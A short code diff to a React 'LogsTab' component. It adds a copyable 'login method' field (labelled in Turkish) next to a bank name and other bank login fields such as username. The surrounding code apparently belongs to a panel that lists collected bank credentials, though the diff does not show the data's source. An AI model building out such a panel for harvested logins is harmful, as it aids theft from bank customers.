@@ -1006,6 +1006,19 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-2 py-3 align-top">
                       <div className="space-y-1 text-[10px] leading-tight">
                         {fd.bankName && <div className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">{fd.bankName}</div>}
+                        {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
+                          <div className="flex min-w-0 items-start gap-1 leading-tight">
+                            <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                              Giriş Yöntemi
+                            </span>
+                            <span
+                              className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]"
+                              onClick={() => copyToClipboard(fd.loginMethod)}
+                            >
+                              {fd.loginMethod}
+                            </span>
+                          </div>
+                        ) : null}
                         {canonicalBankFields.map(([key, value]) => {
                           let displayKey = key;
                           if (displayKey === "username") displayKey = "ID / K.Adı";
